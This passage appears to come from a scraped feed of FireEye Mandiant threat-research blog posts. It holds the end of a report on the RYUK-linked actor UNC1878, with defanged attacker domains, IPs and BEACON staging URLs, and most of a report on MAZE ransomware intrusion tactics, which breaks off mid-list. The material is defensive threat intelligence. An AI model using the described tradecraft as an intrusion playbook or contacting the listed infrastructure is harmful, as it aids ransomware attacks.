certificates matching UNC1878 tradecraft, we also found self-signed <a href=\"http://www.fastandeasyhacking.com/\">Armitage</a> certificates, indicating this group may use multiple offensive security tools.</p> \n<p>Pivoting on limited indicators extracted from a single Managed Defense intrusion, a small cluster of activity was expanded into a more diverse set of indicators cardinal to UNC1878. While the objective and goal of this threat actor had not yet manifested, the correlation of infrastructure allowed our team to recognize this threat actor’s operations against other customers.</p> \n<h4>Discovery</h4> \n<p>With an established modus operandi for UNC1878, our team quickly identified several related intrusions in support of <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/mandiant/incident-response.html\">FireEye Mandiant</a> investigations over the next week. Within two days of our initial clustering and expansion of UNC1878 from the original Managed Defense investigation, Mandiant Incident Responders were investigating activity at a U.S. based medical equipment company with several indicators we had previously identified and attributed to UNC1878. Attributed domains, payloads and methodologies provided consultants with a baseline to build detections on, as well as a level of confidence in the actor’s capabilities and speed in which they operate.</p> \n<p>Three days later, UNC1878 was identified during another incident response engagement at a restaurant chain. In this engagement, Mandiant consultants found evidence of attempted deployment of RYUK ransomware on hundreds of systems, finally revealing UNC1878’s desired end goal. In the following weeks, we continued to encounter UNC1878 in various phases of their intrusions at several Mandiant Incident Response and Managed Defense customers.</p> \n<p>While services data offers us a depth of understanding into these intrusions, we turn to our product telemetry to understand the breadth of activity, getting a better worldview and perspective on the global prevalence of this threat actor. This led to the discovery of an UNC1878 intrusion at a technology company, resulting in Mandiant immediately notifying the affected customer. By correlating multiple UNC1878 intrusions across our services and product customers, it became evident that the targeting was indiscriminate, a common characteristic of opportunistic ransomware campaigns.</p> \n<p>Although initially there were unanswered questions surrounding UNC1878’s intent, we were able to provide valuable insights into their capabilities to our consultants and analysts. In turn, the intrusion data gathered during these engagements continued the cycle of building our understanding of UNC1878’s tradecraft, enabling our responders&nbsp;to handle these incidents swiftly in the face of imminent ransomware deployment.</p> \n<h4>Conclusion</h4> \n<p>Threat actors continue to use mass malware campaigns to establish footholds into target environments, followed by interactive operations focused on deploying ransomware such as RYUK, DOPPLEPAYMER and MAZE. Looking at the overall trend of intrusions FireEye responds to, the growing shift from traditional PCI theft to ransomware has allowed threat actors such as UNC1878 to widen their scope and increase their tempo, costing organizations millions of dollars due to business disruption and ransom payments. However, apart from their speed, UNC1878 does not stand out among the increasing number of groups following this trend, and should not be the key takeaway of this blog post.</p> \n<p>The cycle of analysis and discovery used for UNC1878 lies at the core of our team’s mission to rapidly detect and pursue impactful adversaries at scale. Starting from a singular intrusion at a Managed Defense client, we were able to discover UNC1878 activity at multiple customers. Using our analysis of the early stages of their activity allowed us to pivot and pursue this actor across otherwise unrelated investigations. As we refine and expand our understanding of UNC1878’s tradecraft, our team enables Mandiant and Managed Defense to efficiently identify, respond to, and eradicate a financially motivated threat actor whose end goal could cripple targeted organizations. The principles applied in pursuit of this actor are crucial to tracking any adversary and are ultimately how the Advanced Practices team surfaces meaningful activity across the FireEye ecosystem.</p> \n<h4>Acknowledgements</h4> \n<p>Thank you to Andrew Thompson, Dan Perez, Steve Miller, John Gorman and Brendan McKeague for technical review of this content. In addition, thank you to the frontline responders harvesting valuable intrusion data that enables our research.</p> \n<h4>Indicators of Compromise</h4> \n<p> <i>Domains</i></p> \n<ul> \n <li> <span class=\"code\">aaatus[.]com</span></li> \n <li> <span class=\"code\">avrenew[.]com</span></li> \n <li> <span class=\"code\">besttus[.]com</span></li> \n <li> <span class=\"code\">bigtus[.]com</span></li> \n <li> <span class=\"code\">brainschampions[.]com</span></li> \n <li> <span class=\"code\">checkwinupdate[.]com</span></li> \n <li> <span class=\"code\">ciscocheckapi[.]com</span></li> \n <li> <span class=\"code\">cleardefencewin[.]com</span></li> \n <li> <span class=\"code\">cmdupdatewin[.]com</span></li> \n <li> <span class=\"code\">comssite[.]com</span></li> \n <li> <span class=\"code\">conhostservice[.]com</span></li> \n <li> <span class=\"code\">cylenceprotect[.]com</span></li> \n <li> <span class=\"code\">defenswin[.]com</span></li> \n <li> <span class=\"code\">easytus[.]com</span></li> \n <li> <span class=\"code\">findtus[.]com</span></li> \n <li> <span class=\"code\">firsttus[.]com</span></li> \n <li> <span class=\"code\">freeallsafe[.]com</span></li> \n <li> <span class=\"code\">freeoldsafe[.]com</span></li> \n <li> <span class=\"code\">greattus[.]com</span></li> \n <li> <span class=\"code\">havesetup[.]net</span></li> \n <li> <span class=\"code\">iexploreservice[.]com</span></li> \n <li> <span class=\"code\">jomamba[.]best</span></li> \n <li> <span class=\"code\">livecheckpointsrs[.]com</span></li> \n <li> <span class=\"code\">livetus[.]com</span></li> \n <li> <span class=\"code\">lsassupdate[.]com</span></li> \n <li> <span class=\"code\">lsasswininfo[.]com</span></li> \n <li> <span class=\"code\">microsoftupdateswin[.]com</span></li> \n <li> <span class=\"code\">myservicebooster[.]com</span></li> \n <li> <span class=\"code\">myservicebooster[.]net</span></li> \n <li> <span class=\"code\">myserviceconnect[.]net</span></li> \n <li> <span class=\"code\">myserviceupdater[.]com</span></li> \n <li> <span class=\"code\">myyserviceupdater[.]com</span></li> \n <li> <span class=\"code\">renovatesystem[.]com</span></li> \n <li> <span class=\"code\">service-updater[.]com</span></li> \n <li> <span class=\"code\">servicesbooster[.]com</span></li> \n <li> <span class=\"code\">servicesbooster[.]org</span></li> \n <li> <span class=\"code\">servicesecurity[.]org</span></li> \n <li> <span class=\"code\">serviceshelpers[.]com</span></li> \n <li> <span class=\"code\">serviceupdates[.]net</span></li> \n <li> <span class=\"code\">serviceuphelper[.]com</span></li> \n <li> <span class=\"code\">sophosdefence[.]com</span></li> \n <li> <span class=\"code\">target-support[.]online</span></li> \n <li> <span class=\"code\">taskshedulewin[.]com</span></li> \n <li> <span class=\"code\">timesshifts[.]com</span></li> \n <li> <span class=\"code\">topsecurityservice[.]net</span></li> \n <li> <span class=\"code\">topservicehelper[.]com</span></li> \n <li> <span class=\"code\">topservicesbooster[.]com</span></li> \n <li> <span class=\"code\">topservicesecurity[.]com</span></li> \n <li> <span class=\"code\">topservicesecurity[.]net</span></li> \n <li> <span class=\"code\">topservicesecurity[.]org</span></li> \n <li> <span class=\"code\">topservicesupdate[.]com</span></li> \n <li> <span class=\"code\">topservicesupdates[.]com</span></li> \n <li> <span class=\"code\">topserviceupdater[.]com</span></li> \n <li> <span class=\"code\">update-wind[.]com</span></li> \n <li> <span class=\"code\">updatemanagir[.]us</span></li> \n <li> <span class=\"code\">updatewinlsass[.]com</span></li> \n <li> <span class=\"code\">updatewinsoftr[.]com</span></li> \n <li> <span class=\"code\">web-analysis[.]live</span></li> \n <li> <span class=\"code\">windefenceinfo[.]com</span></li> \n <li> <span class=\"code\">windefens[.]com</span></li> \n <li> <span class=\"code\">winsysteminfo[.]com</span></li> \n <li> <span class=\"code\">winsystemupdate[.]com</span></li> \n <li> <span class=\"code\">worldtus[.]com</span></li> \n <li> <span class=\"code\">yoursuperservice[.]com</span></li> \n</ul> \n<p> <i>IP Addresses</i></p> \n<ul> \n <li> <span class=\"code\">31.7.59.141</span></li> \n <li> <span class=\"code\">45.32.30.162</span></li> \n <li> <span class=\"code\">45.32.130.5</span></li> \n <li> <span class=\"code\">45.32.161.213</span></li> \n <li> <span class=\"code\">45.32.170.9</span></li> \n <li> <span class=\"code\">45.63.8.219</span></li> \n <li> <span class=\"code\">45.63.95.187</span></li> \n <li> <span class=\"code\">45.76.20.140</span></li> \n <li> <span class=\"code\">45.76.167.35</span></li> \n <li> <span class=\"code\">45.76.231.195</span></li> \n <li> <span class=\"code\">45.77.58.172</span></li> \n <li> <span class=\"code\">45.77.89.31</span></li> \n <li> <span class=\"code\">45.77.98.157</span></li> \n <li> <span class=\"code\">45.77.119.212</span></li> \n <li> <span class=\"code\">45.77.153.72</span></li> \n <li> <span class=\"code\">45.77.206.105</span></li> \n <li> <span class=\"code\">63.209.33.131</span></li> \n <li> <span class=\"code\">66.42.97.225</span></li> \n <li> <span class=\"code\">66.42.99.79</span></li> \n <li> <span class=\"code\">79.124.60.117</span></li> \n <li> <span class=\"code\">80.240.18.106</span></li> \n <li> <span class=\"code\">81.17.25.210</span></li> \n <li> <span class=\"code\">95.179.147.215</span></li> \n <li> <span class=\"code\">95.179.210.8</span></li> \n <li> <span class=\"code\">95.179.215.228</span></li> \n <li> <span class=\"code\">96.30.192.141</span></li> \n <li> <span class=\"code\">96.30.193.57</span></li> \n <li> <span class=\"code\">104.156.227.250</span></li> \n <li> <span class=\"code\">104.156.245.0</span></li> \n <li> <span class=\"code\">104.156.250.132</span></li> \n <li> <span class=\"code\">104.156.255.79</span></li> \n <li> <span class=\"code\">104.238.140.239</span></li> \n <li> <span class=\"code\">104.238.190.126</span></li> \n <li> <span class=\"code\">108.61.72.29</span></li> \n <li> <span class=\"code\">108.61.90.90</span></li> \n <li> <span class=\"code\">108.61.176.237</span></li> \n <li> <span class=\"code\">108.61.209.123</span></li> \n <li> <span class=\"code\">108.61.242.184</span></li> \n <li> <span class=\"code\">140.82.5.67</span></li> \n <li> <span class=\"code\">140.82.10.222</span></li> \n <li> <span class=\"code\">140.82.27.146</span></li> \n <li> <span class=\"code\">140.82.60.155</span></li> \n <li> <span class=\"code\">144.202.12.197</span></li> \n <li> <span class=\"code\">144.202.83.4</span></li> \n <li> <span class=\"code\">149.28.15.247</span></li> \n <li> <span class=\"code\">149.28.35.35</span></li> \n <li> <span class=\"code\">149.28.50.31</span></li> \n <li> <span class=\"code\">149.28.55.197</span></li> \n <li> <span class=\"code\">149.28.81.19</span></li> \n <li> <span class=\"code\">149.28.113.9</span></li> \n <li> <span class=\"code\">149.28.122.130</span></li> \n <li> <span class=\"code\">149.28.246.25</span></li> \n <li> <span class=\"code\">149.248.5.240</span></li> \n <li> <span class=\"code\">149.248.56.113</span></li> \n <li> <span class=\"code\">149.248.58.11</span></li> \n <li> <span class=\"code\">151.106.56.223</span></li> \n <li> <span class=\"code\">155.138.135.182</span></li> \n <li> <span class=\"code\">155.138.214.247</span></li> \n <li> <span class=\"code\">155.138.216.133</span></li> \n <li> <span class=\"code\">155.138.224.221</span></li> \n <li> <span class=\"code\">207.148.8.61</span></li> \n <li> <span class=\"code\">207.148.15.31</span></li> \n <li> <span class=\"code\">207.148.21.17</span></li> \n <li> <span class=\"code\">207.246.67.70</span></li> \n <li> <span class=\"code\">209.222.108.106</span></li> \n <li> <span class=\"code\">209.250.255.172</span></li> \n <li> <span class=\"code\">216.155.157.249</span></li> \n <li> <span class=\"code\">217.69.15.175</span></li> \n</ul> \n<p> <i>BEACON Staging URLs</i></p> \n<ul> \n <li> <span class=\"code\">hxxp://104.156.255[.]79:80/avbcbgfyhunjmkmk</span></li> \n <li> <span class=\"code\">hxxp://149.28.50[.]31:80/adsrxdfcffdxfdsgfxzxds</span></li> \n <li> <span class=\"code\">hxxp://149.28.81[.]19:80/ajdlkashduiqwhuyeu12312g3yugshdahqjwgye1g2uy31u1</span></li> \n <li> <span class=\"code\">hxxp://45.32.161[.]213:80/ephfusaybuzabegaexbkakskjfgksajgbgfckskfnrdgnkhdsnkghdrngkhrsngrhgcngyggfxbgufgenwfxwgfeuyenfgx</span></li> \n <li> <span class=\"code\">hxxp://45.63.8[.]219:80/ajhgfrtyujhytr567uhgfrt6y789ijhg</span></li> \n <li> <span class=\"code\">hxxp://66.42.97[.]225:80/aqedfy345yu9876red45f6g78j90</span></li> \n <li> <span class=\"code\">hxxp://findtus[.]com/akkhujhbjcjcjhufuuljlvu</span></li> \n <li> <span class=\"code\">hxxp://thedemocraticpost[.]com/kflmgkkjdfkmkfl</span></li> \n <li> <span class=\"code\">hxxps://brainschampions[.]com:443/atrsgrtehgsetrh5ge</span></li> \n <li> <span class=\"code\">hxxps://ciscocheckapi[.]com:80/adsgsergesrtvfdvsa</span></li> \n <li> <span class=\"code\">hxxps://cylenceprotect[.]com:80/abresgbserthgsbabrt</span></li> \n <li> <span class=\"code\">hxxps://havesetup[.]net/afgthyjuhtgrfety</span></li> \n <li> <span class=\"code\">hxxps://servicesbooster[.]org:443/sfer4f54</span></li> \n <li> <span class=\"code\">hxxps://servicesecurity[.]org:443/fuhvbjk</span></li> \n <li> <span class=\"code\">hxxps://timesshifts[.]com:443/akjhtyrdtfyguhiugyft</span></li> \n <li> <span class=\"code\">hxxps://timesshifts[.]com:443/ry56rt6yh5rth</span></li> \n <li> <span class=\"code\">hxxps://update-wind[.]com/aergerhgrhgeradgerg</span></li> \n <li> <span class=\"code\">hxxps://updatemanagir[.]us:80/afvSfaewfsdZFAesf</span></li> \n</ul>","descriptionType":"html","publishedDate":"Tue, 31 Mar 2020 15:00:00 +0000","feedId":1226,"bgimg":"","linkMd5":"4f3f21bc461a1e14f63aeff617885d2c","bgimgJsdelivr":"","metaImg":"","author":"Van Ta","publishedOrCreatedDate":1598278264225},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Navigating the MAZE: Tactics, Techniques and Procedures Associated With\nMAZE Ransomware Incidents","link":"http://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html","description":"<p>Targeted ransomware incidents have brought a threat of disruptive and destructive attacks to organizations across industries and geographies. FireEye <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/mandiant/threat-intelligence.html\">Mandiant Threat Intelligence</a> has previously documented this threat in our investigations of <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2020/03/they-come-in-the-night-ransomware-deployment-trends.html\">trends across ransomware incidents</a>, <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\">FIN6 activity</a>, <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2020/02/ransomware-against-machine-learning-to-disrupt-industrial-production.html\">implications for OT networks</a>, and other aspects of post-compromise ransomware deployment. Since November 2019, we’ve seen the MAZE ransomware being used in attacks that combine targeted ransomware use, public exposure of victim data, and an affiliate model.</p> \n<p>Malicious actors have been actively deploying MAZE ransomware since at least May 2019. The ransomware was initially distributed via spam emails and exploit kits before later shifting to being deployed post-compromise. Multiple actors are involved in MAZE ransomware operations, based on our observations of alleged users in underground forums and distinct tactics, techniques, and procedures across Mandiant incident response engagements. Actors behind MAZE also maintain a public-facing website where they post data stolen from victims who refuse to pay an extortion fee.</p> \n<p>The combination of these two damaging intrusion outcomes—dumping sensitive data and disrupting enterprise networks—with a criminal service makes MAZE a notable threat to many organizations. This blog post is based on information derived from numerous Mandiant incident response engagements and our own research into the MAZE ecosystem and operations.</p> \n<p>Mandiant Threat Intelligence will be available to answer questions on the <a href=\"https://www.brighttalk.com/webcast/10469/408167\">MAZE ransomware threat in a May 21 webinar</a>.</p> \n<h4>Victimology</h4> \n<p>We are aware of more than 100 alleged MAZE victims reported by various media outlets and on the MAZE website since November 2019. These organizations have been primarily based in North America, although victims spanned nearly every geographical region. Nearly every industry sector including manufacturing, legal, financial services, construction, healthcare, technology, retail, and government has been impacted demonstrating that indiscriminate nature of these operations (Figure 1).</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/maze/Picture1.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 1: Geographical and industry distribution of alleged MAZE victims</span></p> \n<h4>Multiple Actors Involved in MAZE Ransomware Operations Identified</h4> \n<p>Mandiant identified multiple Russian-speaking actors who claimed to use MAZE ransomware and were seeking partners to fulfill different functional roles within their teams. Additional information on these actors is available to <a href=\"https://www.fireeye.com/solutions/cyber-threat-intelligence/threat-intelligence-subscriptions.html\">Mandiant Intelligence subscribers</a>. A panel used to manage victims targeted for MAZE ransomware deployment has a section for affiliate transactions. This activity is consistent with our assessment that MAZE operates under an affiliate model and is not distributed by a single group. Under this business model, ransomware developers will partner with other actors (i.e. affiliates) who are responsible for distributing the malware. In these scenarios, when a victim pays the ransom demand, the ransomware developers receive a commission. Direct affiliates of MAZE ransomware also partner with other actors who perform specific tasks for a percentage of the ransom payment. This includes partners who provide initial access to organizations and pentesters who are responsible for reconnaissance, privilege escalation and lateral movement—each of which who appear to work on a percentage-basis. Notably, in some cases, actors may be hired on a salary basis (vs commission) to perform specific tasks such as determining the victim organization and its annual revenues. This allows for specialization within the cyber criminal ecosystem, ultimately increasing efficiency, while still allowing all parties involved to profit.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/maze/Picture2.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 2: MAZE ransomware panel</span></p> \n<h4>MAZE Initially Distributed via Exploit Kits and Spam Campaigns</h4> \n<p>MAZE ransomware was initially distributed directly via <a href=\"https://www.bleepingcomputer.com/news/security/maze-ransomware-says-computer-type-determines-ransom-amount/\">exploit kits</a> and <a href=\"https://www.proofpoint.com/us/threat-insight/post/ta2101-plays-government-imposter-distribute-malware-german-italian-and-us\">spam campaigns</a> through late 2019. For example, in November 2019, Mandiant observed multiple email campaigns delivering Maze ransomware primarily to individuals at organizations in Germany and the United States, although a significant number of emails were also delivered to entities in Canada, Italy, and South Korea. These emails used tax, invoice, and package delivery themes with document attachments or inline links to documents which download and execute Maze ransomware.</p> \n<p>On November 6 and 7, a Maze campaign targeting Germany delivered macro-laden documents using the subject lines “Wichtige informationen uber Steuerruckerstattung” and “1&amp;1 Internet AG - Ihre Rechnung 19340003422 vom 07.11.19” (Figure 3). Recipients included individuals at organizations in a wide range of industries, with the Financial Services, Healthcare, and Manufacturing sectors being targeted most frequently. These emails were sent using a number of malicious domains created with the registrant address gladkoff1991@yandex.ru.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/maze/Picture3.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 3: German-language lure</span></p> \n<p>On November 8, a campaign delivered Maze primarily to Financial Services and Insurance organizations located in the United states. These emails originated from a compromised or spoofed account and contained an inline link to download a Maze executable payload.</p> \n<p>On November 18 and 19, a Maze campaign targeted individuals operating in a range of industries in the United States and Canada with macro documents using phone bill and package delivery themes (Figure 4 and Figure 5). These emails used the subjects “Missed package delivery” and \"Your AT&amp;T wireless bill is ready to view\" and were sent using a number of malicious domains with the registrant address abusereceive@hitler.rocks. Notably, this registrant address was also used to create multiple Italian-language domains towards the end of November 2019.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/maze/Picture4.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 4: AT&amp;T email lure</span></p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/maze/Picture5.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 5: Canada Post email lure</span></p> \n<h4>Shift to Post-Compromise Distribution Maximizes Impact</h4> \n<p>Actors using MAZE have increasingly shifted to deploying the ransomware post-compromise. This methodology provides an opportunity to infect more hosts within a victim’s environment and exfiltrate data, which is leveraged to apply additional pressure on organizations to pay extortion fees. Notably, in at least some cases, the actors behind these operations charge an additional fee, in addition to the decryption key, for the non-release of stolen data.</p> \n<p>Although the high-level intrusion scenarios preceding the distribution of MAZE ransomware are broadly similar, there have been notable variations across intrusions that suggest attribution to distinct teams. Even within these teams, the cyber criminals appear to be task-oriented meaning that one operator is not responsible for the full lifecycle. The following sections highlight the TTPs seen in a subset of incidents and serve to illustrate the divergence that may occur due to the fact that numerous, disparate actors are involved in different phases of these operations. Notably, the time between initial compromise to encryption has also been widely varied, from weeks to many months.</p> \n<p> <i>Initial Compromise</i></p> \n<p>There are few clear patterns for intrusion vector across analyzed MAZE ransomware incidents. This is consistent with our observations of multiple actors who use MAZE soliciting partners with network access. The following are a sample of observations from several Mandiant incident response engagements:</p> \n<ul> \n <li>A user downloaded a malicious resume-themed Microsoft Word document that contained macros which launched an IcedID payload, which was ultimately used to execute an instance of BEACON.</li> \n <li>An actor logged into an internet-facing system via RDP. The account used to grant initial access was a generic support account. It is unclear how the actor obtained the account's password.</li> \n <li>An actor exploited a misconfiguration on an Internet-facing system. This access enabled the actor to deploy tools to pivot into the internal network.</li> \n <li>An actor logged into a Citrix web portal account with a weak password. This authenticated access enabled the actor to launch a Meterpreter payload on an internal system.</li> \n</ul> \n<p> <i>Establish Foothold &amp; Maintain Presence</i></p> \n<p>The use of legitimate credentials and broad distribution of BEACON across victim environments appear to be consistent approaches used by actors to establish their foothold in victim networks and to maintain presence as they look to meet their ultimate objective of deploying MAZE ransomware. Despite these commonplace behaviors, we have observed an actor create their own domain account to enable latter-stage operations.</p> \n<ul> \n <li>Across multiple incidents, threat actors deploying MAZE established a foothold in victim environments by installing BEACON payloads on many servers and workstations.</li> \n <li>Web shells were deployed to an internet-facing system. The system level access granted by these web shells was used to enable initial privilege escalation and the execution of a backdoor.</li> \n <li>Intrusion operators regularly obtained and maintained access to multiple domain and local system accounts with varying permissions that were used throughout their operations.</li> \n <li>An actor created a new domain account and added it to the domain administrators group.</li> \n</ul> \n<p> <i>Escalate Privileges</i></p> \n<p>Although Mandiant has observed multiple cases where MAZE intrusion operators employed Mimikatz to collect credentials to enable privilege escalation, these efforts have also been bolstered in multiple cases via use of Bloodhound, and more manual searches for files containing credentials.</p> \n<ul> \n <li>Less than two weeks after initial access, the actor downloaded and interacted with an archive named <i>mimi.zip</i>, which contained files corresponding to the credential harvesting tool Mimikatz. In the following days the same <i>mimi.zip</i> archive was identified on two domain controllers in the impacted environment.</li> \n <li>The actor attempted to find files with the word “password” within the environment. Additionally, several archive files were also created with file names suggestive of credential harvesting activity.</li> \n <li>The actor attempted to identify hosts running the KeePass password safe software.</li> \n <li>Across multiple incidents, the Bloodhound utility was used, presumably to assess possible methods of obtaining credentials with domain administrator privileges.</li> \n <li>Actors primarily used Procdump and Mimikatz to collect credentials used to enable later stages of their intrusion. Notably, both Bloodhound and PingCastle were also used, presumably to enable attackers' efforts to understand the impacted organization's Active Directory configuration. In this case the responsible actors also attempted to exfiltrate collected credentials to multiple different cloud file storage services.</li> \n</ul> \n<p> <i>Reconnaissance</i></p> \n<p>Mandiant has observed a broad range of approaches to network, host, data, and Active Directory reconnaissance across observed MAZE incidents. The varied tools and approaches across these incidents maybe best highlights the divergent ways in which the responsible actors interact with victim networks.</p> \n<ul> \n <li>In some intrusions, reconnaissance activity occurred within three days of gaining initial access to the victim network. The responsible actor executed a large number of reconnaissance scripts via Cobalt Strike to collect network, host, filesystem, and domain related information.</li> \n <li>Multiple built-in Windows commands were used to enable network, account, and host reconnaissance of the impacted environment, though the actors also supplied and used Advanced IP Scanner and Adfind to support this stage of their operations.</li> \n <li>Preliminary network reconnaissance has been conducted using a batch script named '2.bat' which contained a series of nslookup commands. The output of this script was copied into a file named '2.txt'.</li> \n <li>The actor exfiltrated reconnaissance command output data and documents related to the IT environment to an attacker-controlled FTP server via an encoded PowerShell script.</li> \n <li>Over a period of several days, an actor conducted reconnaissance activity using Bloodhound, PowerSploit/PowerView (Invoke-ShareFinder), and a reconnaissance script designed to enumerate directories across internal hosts.</li> \n <li>An actor employed the adfind tool and a batch script to collect information about their network, hosts, domain, and users. The output from this batch script (2adfind.bat) was saved into an archive named 'ad.7z' using an instance of the 7zip archiving utility named <i>7.exe</i>.</li> \n <li>An actor used the tool <i>smbtools.exe&nbsp;</i>to assess whether accounts could login to systems across the environment.</li> \n <li>An actor collected directory listings from file servers across an impacted environment. Evidence of data exfiltration was observed approximately one month later, suggesting that the creation of these directory listings may have been precursor activity, providing the actors with data they may have used to identify sensitive data for future exfiltration.</li> \n</ul> \n<p> <i>Lateral Movement</i></p> \n<p>Across the majority of MAZE ransomware incidents lateral movement was accomplished via Cobalt Strike BEACON and using previously harvested credentials. Despite this uniformity, some alternative tools and approaches were also observed.</p> \n<ul> \n <li>Attackers relied heavily on Cobalt Strike BEACON to move laterally across the impacted environment, though they also tunneled RDP using the ngrok utility, and employed tscon to hijack legitimate rdp sessions to enable both lateral movement and privilege escalation.</li> \n <li>The actor moved laterally throughout some networks leveraging compromised service and user accounts obtained from the system on which they gained their initial foothold. This allowed them to obtain immediate access to additional systems. Stolen credentials were then used to move laterally across the network via RDP and to install BEACON payloads providing the actors with access to nearly one hundred hosts.</li> \n <li>An actor moved laterally using Metasploit and later deployed a Cobalt Strike payload to a system using a local administrator account.</li> \n <li>At least one actor attempted to perform lateral movement using EternalBlue in early and late 2019; however, there is no evidence that these attempts were successful.</li> \n</ul> \n<p> <i>Complete Mission</i></p> \n<p>There was evidence suggesting data exfiltration across most analyzed MAZE ransomware incidents. While malicious actors could monetize stolen data in various way (e.g. sale in an underground forum, fraud), actors employing MAZE are known to threaten the release of stolen data if victim organizations do not pay an extortion fee.</p> \n<ul> \n <li>An actor has been observed exfiltrating data to FTP servers using a base64-encoded PowerShell script designed to upload any files with .7z file extensions to a predefined FTP server using a hard-coded username and password. This script appears to be a slight variant of a <a>script first posted</a> to Microsoft TechNet in 2013.</li> \n <li>A different base64-encoded PowerShell command was also used to enable this functionality in a separate incident.</li> \n <li>Actors deploying MAZE ransomware have also used the utility WinSCP to exfiltrate data to an attacker-controlled FTP server.</li> \n <li>An actor has been observed employing a file replication utility and copying the stolen data to a cloud file hosting/sharing service.</li> \n <li>Prior to deploying MAZE ransomware threat actors employed the 7zip utility to archive data from across various corporate file shares. These archives were then exfiltrated to an attacker-controlled server via FTP using the WinSCP utility.</li> \n</ul> \n<p>In addition to data theft, actors deploy MAZE ransomware to encrypt files identified on the victim network. Notably, the aforementioned MAZE panel has an option to specify the date on which ransom demands will double, likely to create a sense of urgency to their demands.</p> \n<ul> \n <li>Five days after data was exfiltrated from a victim environment the actor copied a MAZE ransomware binary to 15 hosts within the victim environment and successfully executed it on a portion of these systems.</li> \n <li>Attackers employed batch scripts and a series to txt files containing host names to distribute and execute MAZE ransomware on many servers and workstations across the victim environment.</li> \n <li>An actor deployed MAZE ransomware to tens of hosts, explicitly logging into each system using a domain administrator account created earlier in the intrusion.</li> \n <li>Immediately following the exfiltration of sensitive data, the actors began deployment of MAZE ransomware to hosts across the network. In some cases, thousands of hosts were ultimately encrypted. The encryption process proceeded as follows:\n  <ul> \n   <li>A batch script named <i>start.bat</i> was used to execute a series of secondary batch scripts with names such as <i>xaa3x.bat</i> or <i>xab3x.bat</i>.</li> \n   <li>Each of these batch scripts contained a series of commands that employed the copy command, WMIC, and PsExec to copy and execute a kill script (windows.bat) and an instance of MAZE ransomware (sss.exe) on hosts across the impacted environment</li> \n   <li>Notably, forensic analysis of the impacted environment revealed MAZE deployment scripts targeting ten times as many hosts as were ultimately encrypted.</li> \n  </ul> </li> \n</ul> \n<h4>Implications</h4> \n<p>Based on our belief that the MAZE ransomware is distributed by multiple actors, we anticipate that the TTPs used throughout incidents associated with this ransomware will continue to vary somewhat, particularly in terms of the initial intrusion vector. For more comprehensive recommendations for addressing ransomware, please refer to our&nbsp;<a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2019/09/ransomware-protection-and-containment-strategies.html\">Ransomware Protection and Containment Strategies</a>&nbsp;blog post&nbsp;and the linked <a href=\"https://www.fireeye.com/content/dam/fireeye-www/current-threats/pdfs/wp-ransomware-protection-and-containment-strategies.pdf\">white paper</a>.</p> \n<h4>Mandiant Security Validation Actions</h4> \n<p>Organizations can validate their security controls against more than 20 MAZE-specific actions with <a href=\"https://www.fireeye.com/solutions/verodin-security-instrumentation.html\">Mandiant Security Validation</a>. Please see our Headline Release Content Updates – April 21, 2020 on the <a href=\"https://customer.verodin.com/\">Mandiant Security Validation Customer Portal</a> for more information.</p> \n<ul> \n <li>A100-877 - Active Directory - BloodHound, CollectionMethod All</li> \n <li>A150-006 - Command and Control - BEACON, Check-in</li> \n <li>A101-030 - Command and Control - MAZE Ransomware, C2 Beacon, Variant #1</li> \n <li>A101-031 - Command and Control - MAZE Ransomware, C2 Beacon, Variant #2</li> \n <li>A101-032 - Command and Control - MAZE Ransomware, C2 Beacon, Variant #3</li> \n <li>A100-878 - Command and Control - MAZE Ransomware, C2 Check-in</li> \n <li>A100-887 - Command and Control - MAZE, DNS Query #1</li> \n <li>A100-888 - Command and Control - MAZE, DNS Query #2</li> \n <li>A100-889 - Command and Control - MAZE, DNS Query #3</li> \n <li>A100-890 -&nbsp; Command and Control - MAZE, DNS Query #4</li> \n <li>A100-891 - Command and Control - MAZE, DNS Query #5</li> \n <li>A100-509 - Exploit Kit Activity - Fallout Exploit Kit CVE-2018-8174, Github PoC</li> \n <li>A100-339 - Exploit Kit Activity - Fallout Exploit Kit CVE-2018-8174, Landing Page</li> \n <li>A101-033 - Exploit Kit Activity - Spelevo Exploit Kit, MAZE C2</li> \n <li>A100-208 - FTP-based Exfil/Upload of PII Data (Various Compression)</li> \n <li>A104-488 - Host CLI - Collection, Exfiltration: Active Directory Reconnaissance with SharpHound, CollectionMethod All</li> \n <li>A104-046 - Host CLI - Collection, Exfiltration: Data from Local Drive using PowerShell</li> \n <li>A104-090 - Host CLI - Collection, Impact: Creation of a Volume Shadow Copy</li> \n <li>A104-489 - Host CLI - Collection: Privilege Escalation Check with PowerUp, Invoke-AllChecks</li> \n <li>A104-037 - Host CLI - Credential Access, Discovery: File &amp; Directory Discovery</li> \n <li>A104-052 - Host CLI - Credential Access: Mimikatz</li> \n <li>A104-167 - Host CLI - Credential Access: Mimikatz (2.1.1)</li> \n <li>A104-490 - Host CLI - Defense Evasion, Discovery: Terminate Processes, Malware Analysis Tools</li> \n <li>A104-491 - Host CLI - Defense Evasion, Persistence: MAZE, Create Target.lnk</li> \n <li>A104-500 - Host CLI - Discovery, Defense Evasion: Debugger Detection</li> \n <li>A104-492 - Host CLI - Discovery, Execution: Antivirus Query with WMI, PowerShell</li> \n <li>A104-374 - Host CLI - Discovery: Enumerate Active Directory Forests</li> \n <li>A104-493 - Host CLI - Discovery: Enumerate Network Shares</li> \n <li>A104-481 - Host CLI - 